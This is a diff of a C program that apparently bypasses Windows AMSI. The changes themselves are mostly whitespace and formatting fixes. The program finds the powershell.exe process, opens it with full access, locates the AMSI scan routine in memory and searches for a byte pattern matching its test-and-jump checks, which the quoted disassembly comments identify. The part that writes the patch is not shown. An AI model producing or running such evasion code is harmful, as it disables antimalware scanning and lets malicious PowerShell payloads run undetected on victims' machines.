@@ -1,7 +1,6 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <stdio.h>
-#include <iostream>
 
 //00007FFAE957C650 | 48:85D2 | test rdx, rdx |
 //00007FFAE957C653 | 74 3F | je amsi.7FFAE957C694 |
@@ -44,9 +43,9 @@ GetPID(
 
 unsigned long long int
 searchPattern(
-	BYTE* startAddress, 
-	DWORD searchSize, 
-	BYTE* pattern, 
+	BYTE* startAddress,
+	DWORD searchSize,
+	BYTE* pattern,
 	DWORD patternSize)
 {
 	DWORD i = 0;
@@ -54,7 +53,7 @@ searchPattern(
 	while (i < 1024) {
 
 		if (startAddress[i] == pattern[0]) {
-			DWORD j =1;
+			DWORD j = 1;
 			while (j < patternSize && i + j < searchSize && (pattern[j] == '?' || startAddress[i + j] == pattern[j])) {
 				j++;
 			}
@@ -70,15 +69,15 @@ searchPattern(
 
 int
 wmain() {
-	
-	BYTE pattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74,'?' ,0x48,'?' ,'?' ,'?' ,'?',0x74,0x33};
+
+	BYTE pattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74,'?' ,0x48,'?' ,'?' ,'?' ,'?',0x74,0x33 };
 
 	DWORD patternSize = sizeof(pattern);
 
 	DWORD tpid = GetPID(L"powershell.exe");
 
 	if (!tpid)
-		return -1;
+		return (-1);
 
 	HANDLE ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, tpid);
 
@@ -94,7 +93,7 @@ wmain() {
 	if (!AmsiAddr)
 		return(-1);
 
-	printf("AMSI address %X\n",AmsiAddr);
+	printf("AMSI address %X\n", AmsiAddr);
 
 	unsigned char buff[1024];
 
@@ -113,5 +112,5 @@ wmain() {
 
 	system("pause");
 
-	return 0;
+	return (0);
 }
